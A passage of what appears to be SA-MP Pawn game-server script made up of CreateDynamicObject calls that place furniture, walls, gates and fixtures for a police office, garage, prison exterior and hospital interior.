	CreateDynamicObject(1721,1593.3000000,-1752.2000000,-37.7999990,0.0000000,0.0000000,214.4953600); //object(est_chair1) (32)
	CreateDynamicObject(912,1589.6000000,-1754.3000000,-37.2999990,0.0000000,0.0000000,90.0000000); //object(bust_cabinet_2) (1)
	CreateDynamicObject(2614,1593.6000000,-1756.0000000,-35.5999980,0.0000000,0.0000000,177.7500000); //object(cj_us_flag) (3)
	CreateDynamicObject(1999,1580.6000000,-1754.6000000,-37.7999990,0.0000000,0.0000000,50.7500000); //object(officedesk2) (2)
	CreateDynamicObject(1999,1584.4000000,-1754.0000000,-37.7999990,0.0000000,0.0000000,304.7500000); //object(officedesk2) (3)
	CreateDynamicObject(1714,1583.6000000,-1755.3000000,-37.7999990,0.0000000,0.0000000,137.2485400); //object(kb_swivelchair1) (2)
	CreateDynamicObject(1714,1582.0000000,-1755.4000000,-37.7999990,0.0000000,0.0000000,220.2467000); //object(kb_swivelchair1) (3)
	CreateDynamicObject(1721,1580.4000000,-1752.5000000,-37.7999990,0.0000000,0.0000000,214.4915800); //object(est_chair1) (33)
	CreateDynamicObject(1721,1579.2000000,-1753.9000000,-37.7999990,0.0000000,0.0000000,251.5000000); //object(est_chair1) (34)
	CreateDynamicObject(1742,1577.8000000,-1749.0000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(med_bookshelf) (9)
	CreateDynamicObject(1742,1584.3000000,-1749.0000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(med_bookshelf) (10)
	CreateDynamicObject(1721,1586.6000000,-1754.3000000,-37.7999990,0.0000000,0.0000000,120.2415800); //object(est_chair1) (35)
	CreateDynamicObject(1721,1585.7000000,-1753.3000000,-37.7999990,0.0000000,0.0000000,120.2398700); //object(est_chair1) (36)
	CreateDynamicObject(2164,1587.0000000,-1756.1000000,-37.7999990,0.0000000,0.0000000,180.0000000); //object(med_office_unit_5) (2)
	CreateDynamicObject(2164,1576.6000000,-1753.6000000,-37.7999990,0.0000000,0.0000000,90.0000000); //object(med_office_unit_5) (3)
	CreateDynamicObject(2614,1584.5000000,-1756.0000000,-35.5999980,0.0000000,0.0000000,179.5000000); //object(cj_us_flag) (4)
	CreateDynamicObject(2614,1580.5000000,-1756.0000000,-35.7000010,0.0000000,0.0000000,178.7500000); //object(cj_us_flag) (5)
	CreateDynamicObject(1721,1579.2002000,-1753.9004000,-37.7999990,0.0000000,0.0000000,251.4990200); //object(est_chair1) (37)
	CreateDynamicObject(19447,1596.1000000,-1741.6000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1589.2002000,-1741.5996000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1592.5996000,-1741.5996000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1585.7002000,-1741.6000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1582.2002000,-1741.5996000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1579.9000000,-1741.6000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19358,1578.1000000,-1736.7000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1578.1000000,-1731.0000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1578.0996000,-1733.5000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(18767,1574.7000000,-1725.1000000,-34.2999990,0.0000000,0.0000000,180.0000000); //object(stands) (1)
	CreateDynamicObject(19358,1576.9004000,-1729.7000000,-32.5999980,0.0000000,0.0000000,74.9981690); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1575.0000000,-1731.2000000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19452,1575.0000000,-1729.4000000,-34.2099990,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19358,1574.2002000,-1729.4004000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1571.0000000,-1729.4000000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1576.5000000,-1732.8000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19358,1576.5000000,-1736.0000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19358,1576.5000000,-1739.2000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19447,1578.2000000,-1743.1000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19358,1576.9000000,-1738.4000000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19358,1571.9004000,-1731.2002000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1563.0000000,-1727.9000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1568.7000000,-1731.2000000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1565.5000000,-1731.2000000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19452,1566.0000000,-1729.4004000,-34.2099990,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19358,1567.7998000,-1729.4004000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1545.0000000,-1731.2000000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19452,1558.5000000,-1726.0000000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19358,1564.5996000,-1729.4004000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1563.0000000,-1725.0000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19452,1558.5000000,-1723.0000000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1558.5000000,-1729.4004000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1550.0000000,-1717.0000000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1558.5000000,-1720.0000000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19358,1563.0000000,-1721.9000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1563.0000000,-1718.8000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1563.0000000,-1715.9000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1564.5996000,-1731.2002000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1561.5000000,-1715.2998000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1558.5996000,-1715.2998000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1556.0000000,-1715.2998000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19452,1550.0000000,-1720.0000000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1550.0000000,-1723.0000000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1550.0000000,-1726.0000000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1550.0000000,-1729.4004000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19358,1553.9004000,-1715.2998000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1550.7998000,-1715.2998000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1548.2002000,-1715.2998000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1545.2998000,-1715.2998000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1545.2000000,-1716.7000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1545.2000000,-1719.7000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1545.2000000,-1722.7000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1545.2000000,-1725.9000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1545.2000000,-1729.1000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1545.2000000,-1731.0000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1561.4004000,-1731.2002000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1559.0000000,-1731.2002000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1556.0000000,-1731.2002000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1554.0000000,-1731.2002000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1551.0000000,-1731.2002000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1548.0000000,-1731.2002000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19447,1596.0996000,-1751.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1592.5996000,-1751.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1589.2002000,-1751.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1582.2002000,-1751.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1580.8000000,-1755.5000000,-34.2999990,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1578.8000000,-1751.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1578.0000000,-1751.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1585.7002000,-1751.0000000,-34.2999990,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1590.4000000,-1755.3000000,-34.2999990,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1599.4000000,-1755.4000000,-34.2999990,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19302,1549.4000000,-1718.6000000,-32.9000020,0.0000000,0.0000000,0.0000000); //object(vgstwires21_lvs) (1)
	CreateDynamicObject(19388,1549.4000000,-1718.6000000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19358,1546.2000000,-1718.6000000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1559.8000000,-1716.9000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19388,1562.2002000,-1718.5996000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19302,1562.2998000,-1718.5996000,-32.9000020,0.0000000,0.0000000,0.0000000); //object(vgstwires21_lvs) (2)
	CreateDynamicObject(19358,1550.3000000,-1717.0000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1559.7998000,-1718.5996000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19388,1557.4004000,-1718.5996000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19302,1557.5000000,-1718.5996000,-32.9000020,0.0000000,0.0000000,0.0000000); //object(vgstwires21_lvs) (3)
	CreateDynamicObject(19358,1555.7002000,-1717.0000000,-32.5999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19388,1552.0000000,-1718.5996000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19302,1552.0996000,-1718.5996000,-32.9000020,0.0000000,0.0000000,0.0000000); //object(vgstwires21_lvs) (4)
	CreateDynamicObject(19358,1554.2002000,-1718.5996000,-32.5999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(1771,1560.7000000,-1717.0000000,-33.5000000,0.0000000,0.0000000,0.0000000); //object(cj_bunk_bed1) (1)
	CreateDynamicObject(19452,1558.5000000,-1717.0000000,-34.2000010,0.0000000,90.0000000,90.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(1771,1559.0000000,-1716.9000000,-33.5000000,0.0000000,0.0000000,0.0000000); //object(cj_bunk_bed1) (2)
	CreateDynamicObject(1771,1554.8000000,-1717.0000000,-33.5000000,0.0000000,0.0000000,0.0000000); //object(cj_bunk_bed1) (3)
	CreateDynamicObject(1771,1545.9000000,-1717.0000000,-33.5000000,0.0000000,0.0000000,0.0000000); //object(cj_bunk_bed1) (4)
	CreateDynamicObject(2602,1549.8000000,-1715.8000000,-33.5999980,0.0000000,0.0000000,0.0000000); //object(police_cell_toilet) (1)
	CreateDynamicObject(2602,1551.2000000,-1715.8000000,-33.5999980,0.0000000,0.0000000,0.0000000); //object(police_cell_toilet) (2)
	CreateDynamicObject(2602,1556.4000000,-1715.8000000,-33.5999980,0.0000000,0.0000000,0.0000000); //object(police_cell_toilet) (3)
	CreateDynamicObject(2602,1562.4000000,-1715.8000000,-33.5999980,0.0000000,0.0000000,0.0000000); //object(police_cell_toilet) (4)
	CreateDynamicObject(2008,1552.0000000,-1727.9000000,-34.0999980,0.0000000,0.0000000,0.0000000); //object(officedesk1) (1)
	CreateDynamicObject(2008,1546.7998000,-1727.9004000,-34.0999980,0.0000000,0.0000000,0.0000000); //object(officedesk1) (7)
	CreateDynamicObject(2008,1556.2000000,-1727.8000000,-34.0999980,0.0000000,0.0000000,0.0000000); //object(officedesk1) (8)
	CreateDynamicObject(1671,1547.4000000,-1729.1000000,-33.7000010,0.0000000,0.0000000,180.0000000); //object(swivelchair_a) (2)
	CreateDynamicObject(1671,1557.1000000,-1729.0000000,-33.7000010,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (2)
	CreateDynamicObject(1671,1552.9004000,-1729.0996000,-33.7000010,0.0000000,0.0000000,179.9945100); //object(swivelchair_a) (2)
	CreateDynamicObject(949,1554.6000000,-1727.8000000,-33.5000000,0.0000000,0.0000000,0.0000000); //object(plant_pot_4) (1)
	CreateDynamicObject(949,1549.7998000,-1727.9004000,-33.5000000,0.0000000,0.0000000,0.0000000); //object(plant_pot_4) (1)
	CreateDynamicObject(949,1558.7000000,-1727.9000000,-33.5000000,0.0000000,0.0000000,0.0000000); //object(plant_pot_4) (1)
	CreateDynamicObject(1808,1545.5000000,-1724.3000000,-34.0999980,0.0000000,0.0000000,90.0000000); //object(cj_watercooler2) (1)
	CreateDynamicObject(1808,1545.5000000,-1724.7002000,-34.0999980,0.0000000,0.0000000,90.0000000); //object(cj_watercooler2) (2)
	CreateDynamicObject(2833,1557.4000000,-1724.5000000,-34.0999980,0.0000000,0.0000000,0.0000000); //object(gb_livingrug02) (1)
	CreateDynamicObject(2836,1550.4000000,-1724.6000000,-34.0999980,0.0000000,0.0000000,0.0000000); //object(gb_livingrug05) (1)
	CreateDynamicObject(19447,1573.9000000,-1729.8000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1578.0000000,-1734.7998000,-31.0000000,0.0000000,90.0000000,0.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1555.0000000,-1729.6000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1549.3000000,-1726.5000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1564.5000000,-1729.7998000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1547.5000000,-1729.5000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1559.0000000,-1726.5000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1559.0000000,-1723.2000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1559.0000000,-1719.8000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1559.0000000,-1717.0000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1549.3000000,-1723.2000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1549.2998000,-1717.0000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1559.0000000,-1717.0000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)
	CreateDynamicObject(19447,1549.2998000,-1719.8000000,-31.0000000,0.0000000,90.0000000,90.0000000); //object(cs_detrok13) (12)

    // New Garage Interior
   	CreateDynamicObject(4113, 1345.67102, -1552.93115, 10000.28613,   360.00000, 0.00000, 3.00000);
	CreateDynamicObject(19462, 1336.32971, -1553.10181, 10038.04492,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19462, 1341.18787, -1557.81592, 10038.04492,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19462, 1345.90967, -1553.07239, 10038.04492,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19462, 1344.42712, -1553.11438, 10039.70996,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1340.92188, -1553.09058, 10039.70996,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1337.44592, -1553.09058, 10039.70996,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(17951, 1341.34399, -1544.32617, 10038.05664,   0.00000, 0.00000, 89.88000);
	CreateDynamicObject(948, 1336.66797, -1544.65063, 10036.31836,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(948, 1345.57263, -1544.76892, 10036.31836,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2293, 1336.95825, -1557.24841, 10036.31641,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2293, 1336.96558, -1556.29590, 10036.31641,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2293, 1336.97388, -1555.36316, 10036.31641,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2293, 1336.98230, -1554.42322, 10036.31641,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2063, 1345.52991, -1556.32043, 10037.19922,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(14699, 1345.99536, -1553.52820, 10038.16602,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14699, 1340.63391, -1553.51819, 10038.16602,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14699, 1345.99536, -1557.54822, 10038.16602,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14699, 1340.63391, -1557.49817, 10038.16602,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19175, 1336.41150, -1555.94495, 10038.71289,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18644, 1345.57043, -1555.75439, 10037.14746,   0.00000, 90.00000, 30.78000);
	CreateDynamicObject(18644, 1345.40259, -1555.22449, 10037.14746,   0.00000, 90.00000, 122.34000);
	CreateDynamicObject(18644, 1345.59546, -1556.11877, 10037.14746,   0.00000, 90.00000, 30.78000);
	CreateDynamicObject(18635, 1345.44617, -1556.81836, 10037.95801,   90.00000, 90.00000, 55.92000);
	CreateDynamicObject(18635, 1345.44226, -1555.79651, 10037.54492,   90.00000, 90.00000, 55.92000);
	CreateDynamicObject(18633, 1345.54663, -1557.19678, 10037.14844,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(18633, 1345.44995, -1556.40662, 10036.70996,   0.00000, 90.00000, -38.10000);
	CreateDynamicObject(2062, 1345.47607, -1550.93372, 10036.88477,   0.00000, 0.00000, -145.92000);
	CreateDynamicObject(18652, 1340.95715, -1557.72644, 10038.67969,   0.00000, 0.00000, -89.46003);
	CreateDynamicObject(18652, 1340.95715, -1557.72644, 10038.10156,   0.00000, 0.00000, -89.46003);
	CreateDynamicObject(18652, 1340.95715, -1557.72644, 10037.56934,   0.00000, 0.00000, -89.46003);
	CreateDynamicObject(1548, 1340.98352, -1557.73181, 10038.36133,   90.00000, 0.00000, 180.00000);
	CreateDynamicObject(1548, 1340.98352, -1557.73181, 10037.82617,   90.00000, 0.00000, 180.00000);
	CreateDynamicObject(2002, 1345.28296, -1552.85522, 10036.31738,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2040, 1345.48535, -1556.80664, 10037.66309,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3384, 1336.70313, -1552.17981, 10037.63281,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2268, 1337.86621, -1557.22314, 10038.32129,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1230, 1345.41028, -1554.38000, 10036.70703,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1230, 1345.41809, -1553.53699, 10036.70703,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2964, 1341.04773, -1554.73755, 10036.31934,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3004, 1341.54382, -1555.12341, 10037.23633,   1.02000, 109.68000, 67.56000);
	CreateDynamicObject(3077, 1336.43762, -1547.89209, 10036.31934,   0.00000, 0.00000, -89.99998);
	CreateDynamicObject(19462, 1336.32813, -1543.49780, 10038.04492,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19462, 1345.90967, -1543.45679, 10038.04492,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19462, 1341.11658, -1544.23462, 10038.04492,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19462, 1341.00537, -1543.50342, 10039.70996,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1344.44080, -1543.48328, 10039.70996,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19462, 1337.53845, -1543.44360, 10039.70996,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19173, 1345.81628, -1547.50745, 10038.54980,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(14699, 1343.22058, -1551.42371, 10038.16602,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1081, 1345.73962, -1545.59155, 10036.75586,   0.00000, 0.00000, -178.86002);
	CreateDynamicObject(1081, 1345.78381, -1546.69653, 10036.75586,   0.00000, 0.00000, -178.86002);
	CreateDynamicObject(1081, 1345.78174, -1547.83362, 10036.75586,   0.00000, 0.00000, -178.86002);
	CreateDynamicObject(1081, 1345.76721, -1548.92798, 10036.75586,   0.00000, 0.00000, -178.86002);
	// New Prison exterior
	CreateDynamicObject(986,1753.39990234,-1591.40002441,14.40000057,0.00000000,0.00000000,347.00000000); //object(gate_autol)(2)
	CreateDynamicObject(986,1749.59997559,-1586.50000000,14.40000057,0.00000000,0.00000000,90.00000000); //object(gate_autol)(3)
	CreateDynamicObject(986,1749.59960938,-1578.50000000,14.40000057,0.00000000,0.00000000,90.00000000); //object(gate_autol)(4)
	CreateDynamicObject(986,1749.59960938,-1570.50000000,14.40000057,0.00000000,0.00000000,90.00000000); //object(gate_autol)(5)
	CreateDynamicObject(986,1757.09863281,-1592.29980469,14.40000057,0.00000000,0.00000000,346.99768066); //object(gate_autol)(6)
	CreateDynamicObject(986,1749.59960938,-1562.50000000,14.40000057,0.00000000,0.00000000,90.00000000); //object(gate_autol)(7)
	CreateDynamicObject(986,1749.59960938,-1554.50000000,14.40000057,0.00000000,0.00000000,90.00000000); //object(gate_autol)(8)
	CreateDynamicObject(986,1749.59960938,-1546.50000000,14.40000057,0.00000000,0.00000000,90.00000000); //object(gate_autol)(9)
	CreateDynamicObject(986,1749.59960938,-1538.50000000,14.40000057,0.00000000,0.00000000,90.00000000); //object(gate_autol)(10)
	CreateDynamicObject(986,1749.59960938,-1535.30004883,14.40000057,0.00000000,0.00000000,90.00000000); //object(gate_autol)(11)
	CreateDynamicObject(986,1755.30004883,-1530.45007324,14.40000057,0.00000000,0.00000000,8.00000000); //object(gate_autol)(13)
	CreateDynamicObject(986,1753.50000000,-1530.69921875,14.40000057,0.00000000,0.00000000,7.99804688); //object(gate_autol)(14)
	CreateDynamicObject(986,1763.29907227,-1529.90002441,14.40000057,0.00000000,0.00000000,0.00000000); //object(gate_autol)(15)
	CreateDynamicObject(986,1781.10021973,-1534.59997559,14.40000057,0.00000000,0.00000000,88.00000000); //object(gate_autol)(16)
	CreateDynamicObject(986,1771.29980469,-1530.10937500,14.40000057,0.00000000,0.00000000,357.28637695); //object(gate_autol)(17)
	CreateDynamicObject(986,1777.22949219,-1530.36914062,14.40000057,0.00000000,0.00000000,357.28637695); //object(gate_autol)(18)
	// new hospital
	CreateDynamicObject(19458,-2658.0700000,1390.7800000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2661.5300000,1390.7900000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19458,-2654.5900000,1390.7700000,944.4500000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19461,-2652.9100000,1390.8400000,946.2800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1536,-2653.0600000,1392.1200000,944.5300000,0.0000000,0.0000000,-89.5200000); //
	CreateDynamicObject(1536,-2653.0400000,1389.1300000,944.5300000,0.0000000,0.0000000,-270.3600000); //
	CreateDynamicObject(948,-2653.3700000,1388.7400000,944.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(948,-2653.3700000,1392.4100000,944.5300000,0.0000000,0.0000000,0.1200000); //
	CreateDynamicObject(19442,-2657.7300000,1392.8000000,944.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2008,-2658.3600000,1393.2800000,944.5300000,0.0000000,0.0000000,-90.0600000); //
	CreateDynamicObject(19442,-2657.7300000,1391.3500000,944.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19442,-2657.7200000,1389.9300000,944.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2008,-2658.3600000,1391.2900000,944.5300000,0.0000000,0.0000000,-90.0600000); //
	CreateDynamicObject(1998,-2659.3500000,1389.3800000,944.5300000,0.0000000,0.0000000,-91.7400000); //
	CreateDynamicObject(19442,-2657.7300000,1388.3900000,944.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1663,-2659.6300000,1392.5800000,945.0400000,0.0000000,0.0000000,83.2200000); //
	CreateDynamicObject(1663,-2659.5100000,1390.3000000,945.0400000,0.0000000,0.0000000,89.0400000); //
	CreateDynamicObject(1663,-2659.6700000,1388.2000000,945.0400000,0.0000000,0.0000000,102.8400000); //
	CreateDynamicObject(19442,-2657.7200000,1394.3800000,944.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19461,-2663.2100000,1390.7900000,946.2700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1649,-2657.7200000,1388.7900000,947.8200000,0.0000000,0.0000000,89.8800000); //
	CreateDynamicObject(1649,-2657.7200000,1393.1700000,947.8200000,0.0000000,0.0000000,89.8800000); //
	CreateDynamicObject(2165,-2662.6000000,1388.6900000,944.5300000,0.0000000,0.0000000,90.2400000); //
	CreateDynamicObject(1663,-2662.1900000,1389.3200000,945.0400000,0.0000000,0.0000000,246.9600000); //
	CreateDynamicObject(2165,-2662.6000000,1390.5800000,944.5300000,0.0000000,0.0000000,90.2400000); //
	CreateDynamicObject(1663,-2661.2700000,1391.4700000,945.0400000,0.0000000,0.0000000,287.3400000); //
